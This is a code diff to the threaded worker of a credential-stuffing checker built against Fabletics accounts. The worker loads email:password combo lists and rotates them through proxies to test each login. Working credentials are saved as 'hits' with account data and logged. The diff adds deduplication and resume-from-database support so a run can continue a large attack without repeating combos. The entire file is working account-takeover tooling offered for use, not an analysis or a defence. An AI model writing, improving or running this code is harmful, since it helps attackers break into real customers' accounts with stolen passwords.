@@ -1,7 +1,6 @@
 from __future__ import annotations
 
 import itertools
-import random
 import threading
 import time
 from dataclasses import dataclass, field
@@ -10,12 +9,14 @@ from typing import Any
 from fabletics.checker import _UNSET, check_account, parse_combo
 from fabletics.proxy import parse_proxy
 
-from .db import insert_hit
+from .db import FINAL_STATUSES, combo_key, insert_hit, is_combo_checked, mark_combo_checked
 
 
 @dataclass
 class JobStats:
     total: int = 0
+    queued: int = 0
+    skipped: int = 0
     checked: int = 0
     hits: int = 0
     fails: int = 0
@@ -42,20 +43,28 @@ class CheckerWorker:
         combos: list[str],
         proxies: list[str],
         threads: int = 5,
-    ) -> bool:
+    ) -> dict[str, int] | None:
         with self._lock:
             if self.stats.running:
-                return False
-            parsed_combos = []
+                return None
+
+            parsed_combos: list[tuple[str, str]] = []
+            seen_keys: set[str] = set()
             for line in combos:
                 parsed = parse_combo(line)
-                if parsed:
-                    parsed_combos.append(parsed)
+                if not parsed:
+                    continue
+                email, password = parsed
+                key = combo_key(email, password)
+                if key in seen_keys:
+                    continue
+                seen_keys.add(key)
+                parsed_combos.append(parsed)
 
             if not parsed_combos:
-                return False
+                return None
 
-            parsed_proxies = []
+            parsed_proxies: list[str] = []
             for line in proxies:
                 line = line.strip()
                 if not line or line.startswith("#"):
@@ -65,17 +74,44 @@ class CheckerWorker:
                 except ValueError:
                     continue
 
+            to_run: list[tuple[str, str]] = []
+            skipped = 0
+            for email, password in parsed_combos:
+                if is_combo_checked(email, password):
+                    skipped += 1
+                else:
+                    to_run.append((email, password))
+
             self.stats = JobStats(
                 total=len(parsed_combos),
+                queued=len(to_run),
+                skipped=skipped,
                 running=True,
             )
+
+            if skipped:
+                self._log(f"Resuming — skipped {skipped} already-checked combo(s)")
+
+            if not to_run:
+                self.stats.running = False
+                self._log("All combos already checked — nothing to do")
+                return {
+                    "total": len(parsed_combos),
+                    "queued": 0,
+                    "skipped": skipped,
+                }
+
             self._thread = threading.Thread(
                 target=self._run,
-                args=(parsed_combos, parsed_proxies, max(1, threads)),
+                args=(to_run, parsed_proxies, max(1, threads)),
                 daemon=True,
             )
             self._thread.start()
-            return True
+            return {
+                "total": len(parsed_combos),
+                "queued": len(to_run),
+                "skipped": skipped,
+            }
 
     def stop(self) -> None:
         with self._lock:
@@ -85,6 +121,8 @@ class CheckerWorker:
         with self._lock:
             return {
                 "total": self.stats.total,
+                "queued": self.stats.queued,
+                "skipped": self.stats.skipped,
                 "checked": self.stats.checked,
                 "hits": self.stats.hits,
                 "fails": self.stats.fails,
@@ -104,9 +142,36 @@ class CheckerWorker:
     def _pick_proxy(self, proxies: list[str], index: int) -> str | None:
         if not proxies:
             return None
-        if len(proxies) == 1:
-            return proxies[0]
         return proxies[index % len(proxies)]
+
+    def _record_result(self, email: str, password: str, result) -> None:
+        status = result.status.lower()
+        if status in FINAL_STATUSES:
+            mark_combo_checked(email, password, status)
+
+        with self._lock:
+            self.stats.checked += 1
+
+        if result.status == "HIT":
+            line = result.format_hit()
+            hit_id = insert_hit(line, email, password, result.data)
+            with self._lock:
+                self.stats.hits += 1
+            self._log(line)
+            if hit_id is None:
+                self._log(f"DUPLICATE | {email}")
+        elif result.status == "FAIL":
+            with self._lock:
+                self.stats.fails += 1
+            self._log(f"FAIL | {email}:{password}")
+        elif result.status == "RETRY":
+            with self._lock:
+                self.stats.retries += 1
+            self._log(f"RETRY | {email} | {result.message}")
+        else:
+            with self._lock:
+                self.stats.errors += 1
+            self._log(f"ERROR | {email} | {result.message}")
 
     def _run(
         self,
@@ -122,13 +187,9 @@ class CheckerWorker:
             with self._lock:
                 if self.stats.stop_requested:
                     return None
-                self.stats.current = f"{email}"
+                self.stats.current = email
 
-            if proxy_cycle:
-                proxy = self._pick_proxy(proxies, idx)
-            else:
-                proxy = _UNSET
-
+            proxy = self._pick_proxy(proxies, idx) if proxy_cycle else _UNSET
             return check_account(email, password, proxy=proxy, timeout=45)
 
         try:
@@ -152,30 +213,10 @@ class CheckerWorker:
                         self._log(f"ERROR | {email} | {exc}")
                         continue
 
-                    with self._lock:
-                        self.stats.checked += 1
+                    if result is None:
+                        continue
 
-                    if result.status == "HIT":
-                        line = result.format_hit()
-                        hit_id = insert_hit(line, email, password, result.data)
-                        with self._lock:
-                            self.stats.hits += 1
-                        self._log(line)
-                        if hit_id is None:
-                            self._log(f"DUPLICATE | {email}")
-                    elif result.status == "FAIL":
-                        with self._lock:
-                            self.stats.fails += 1
-                        self._log(f"FAIL | {email}:{password}")
-                    elif result.status == "RETRY":
-                        with self._lock:
-                            self.stats.retries += 1
-                        self._log(f"RETRY | {email} | {result.message}")
-                    else:
-                        with self._lock:
-                            self.stats.errors += 1
-                        self._log(f"ERROR | {email} | {result.message}")
-
+                    self._record_result(email, password, result)
                     time.sleep(0.05)
         finally:
             with self._lock:
